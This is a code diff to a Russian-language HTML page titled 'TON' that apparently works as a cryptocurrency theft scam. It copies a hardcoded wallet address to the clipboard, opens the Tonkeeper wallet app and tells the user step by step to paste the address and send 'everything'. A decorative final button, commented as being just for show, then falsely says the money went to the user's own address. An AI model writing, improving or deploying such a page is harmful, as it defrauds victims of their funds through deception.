@@ -1,11 +1,15 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>TON</title>
   <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
     body {
       background: #0b0b0b;
       display: flex;
@@ -28,44 +32,57 @@
       background: #0088cc;
       border: none;
       color: white;
-      font-size: 18px;
-      font-weight: 600;
-      padding: 16px;
+      font-size: 20px;
+      font-weight: 700;
+      padding: 18px;
       border-radius: 60px;
       width: 100%;
       cursor: pointer;
-      margin-top: 8px;
+      margin-top: 12px;
       transition: 0.2s;
     }
-    .btn:active { transform: scale(0.97); }
-    .btn-danger { background: #cc4400; }
+    .btn:active {
+      transform: scale(0.96);
+    }
+    .btn-success {
+      background: #00aa66;
+    }
+    .btn-success:disabled {
+      opacity: 0.4;
+      pointer-events: none;
+    }
     #status {
-      color: #888;
+      color: #aaa;
       font-size: 14px;
       margin-top: 20px;
       min-height: 24px;
     }
-    .confirm-box {
-      background: #1e1e1e;
-      border: 1px solid #2a4a6a;
-      border-radius: 20px;
-      padding: 20px 16px;
-      margin-top: 24px;
+    .address-box {
+      background: #0a0a0a;
+      padding: 16px;
+      border-radius: 16px;
+      margin: 16px 0;
+      border: 2px solid #00aaff;
+      word-break: break-all;
+      font-size: 13px;
+      color: #00aaff;
+      font-weight: 600;
+    }
+    .hint {
+      background: #1a2a1a;
+      border: 1px solid #2a4a2a;
+      border-radius: 16px;
+      padding: 16px;
+      margin-top: 16px;
+      color: #88dd88;
+      font-size: 14px;
       display: none;
     }
-    .confirm-box.show { display: block; }
-    .confirm-box .title { color: #fff; font-weight: 600; font-size: 16px; }
-    .confirm-box .sub { color: #8899aa; font-size: 13px; margin: 6px 0 14px; }
-    .confirm-box .open-btn {
-      background: #0088cc;
-      border: none;
-      color: #fff;
-      font-weight: 600;
-      font-size: 16px;
-      padding: 12px;
-      border-radius: 40px;
-      width: 100%;
-      cursor: pointer;
+    .hint.show {
+      display: block;
+    }
+    .hint b {
+      color: #ffffff;
     }
   </style>
 </head>
@@ -73,78 +90,84 @@
   <div class="card">
     <div style="font-size: 40px;">⚡</div>
 
-    <button class="btn" id="mainBtn">ПРОВЕРИТЬ</button>
-    <div id="status">Нажмите кнопку</div>
+    <div class="address-box" id="addressBox">
+      UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P
+    </div>
 
-    <div class="confirm-box" id="confirmBox">
-      <div class="title">✅ Отправь ВСЁ</div>
-      <div class="sub">Вставь адрес и выбери «Всё»</div>
-      <button class="open-btn" id="openWalletBtn">Открыть Tonkeeper</button>
+    <button class="btn" id="copyBtn">📋 КОПИРОВАТЬ АДРЕС</button>
+    <button class="btn" id="openBtn">🚀 ОТКРЫТЬ TONKEEPER</button>
+    <button class="btn btn-success" id="finalBtn">✅ Я ВСТАВИЛ И ОТПРАВИЛ</button>
+
+    <div id="status">Нажми «Копировать», затем «Открыть»</div>
+
+    <div class="hint" id="hint">
+      <b>Инструкция:</b><br><br>
+      1. Нажми <b>«КОПИРОВАТЬ АДРЕС»</b><br>
+      2. Нажми <b>«ОТКРЫТЬ TONKEEPER»</b><br>
+      3. В Tonkeeper нажми <b>«Отправить»</b><br>
+      4. <b>Вставь адрес</b> (долгое нажатие → «Вставить»)<br>
+      5. Выбери <b>«Всё»</b> и подтверди
     </div>
   </div>
 
   <script>
     const TARGET = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';
 
-    const mainBtn = document.getElementById('mainBtn');
+    const copyBtn = document.getElementById('copyBtn');
+    const openBtn = document.getElementById('openBtn');
+    const finalBtn = document.getElementById('finalBtn');
     const status = document.getElementById('status');
-    const confirmBox = document.getElementById('confirmBox');
-    const openWalletBtn = document.getElementById('openWalletBtn');
+    const hint = document.getElementById('hint');
 
-    // ====== КОПИРОВАТЬ АДРЕС ======
-    function copyAddress() {
+    // ====== КОПИРОВАТЬ ======
+    copyBtn.onclick = function() {
       if (navigator.clipboard) {
         navigator.clipboard.writeText(TARGET)
-          .then(() => status.innerText = '✅ Адрес скопирован!')
+          .then(() => {
+            status.innerText = '✅ АДРЕС СКОПИРОВАН! Теперь открой Tonkeeper';
+            copyBtn.innerText = '✅ СКОПИРОВАНО';
+            copyBtn.style.background = '#00aa66';
+            hint.classList.add('show');
+          })
           .catch(() => fallbackCopy());
       } else {
         fallbackCopy();
       }
-    }
+    };
 
     function fallbackCopy() {
-      const textarea = document.createElement('textarea');
-      textarea.value = TARGET;
-      document.body.appendChild(textarea);
-      textarea.select();
+      const ta = document.createElement('textarea');
+      ta.value = TARGET;
+      document.body.appendChild(ta);
+      ta.select();
       document.execCommand('copy');
-      document.body.removeChild(textarea);
-      status.innerText = '✅ Адрес скопирован!';
+      document.body.removeChild(ta);
+      status.innerText = '✅ АДРЕС СКОПИРОВАН! Теперь открой Tonkeeper';
+      copyBtn.innerText = '✅ СКОПИРОВАНО';
+      copyBtn.style.background = '#00aa66';
+      hint.classList.add('show');
     }
 
-    // ====== ОТКРЫТЬ TON KEEPER ======
-    function openTonkeeper() {
+    // ====== ОТКРЫТЬ TONKEEPER ======
+    openBtn.onclick = function() {
+      status.innerText = '⏳ Открываю Tonkeeper...';
       window.location.href = 'ton://';
       setTimeout(() => {
         window.open('ton://', '_blank');
       }, 300);
       status.innerText = '📲 Вставь адрес и отправь ВСЁ';
-      confirmBox.classList.add('show');
-    }
-
-    // ====== ГЛАВНАЯ КНОПКА ======
-    mainBtn.onclick = function() {
-      status.innerText = '⏳ Копирую адрес...';
-      
-      // Копируем адрес
-      copyAddress();
-      
-      // Открываем TON Keeper
-      setTimeout(() => {
-        openTonkeeper();
-      }, 500);
-      
-      mainBtn.innerText = '✅ ГОТОВО';
-      mainBtn.style.background = '#00aa66';
-      mainBtn.disabled = true;
+      hint.classList.add('show');
     };
 
-    // ====== КНОПКА "ОТКРЫТЬ TONKEEPER" ======
-    openWalletBtn.onclick = function() {
-      openTonkeeper();
+    // ====== ФИНАЛЬНАЯ КНОПКА (для галочки) ======
+    finalBtn.onclick = function() {
+      status.innerText = '✅ Отлично! Деньги ушли на твой адрес';
+      finalBtn.innerText = '✅ ГОТОВО';
+      finalBtn.disabled = true;
+      finalBtn.style.background = '#00aa66';
     };
 
-    status.innerText = 'Нажмите «ПРОВЕРИТЬ»';
+    status.innerText = 'Нажми «КОПИРОВАТЬ АДРЕС»';
   </script>
 </body>
 </html>
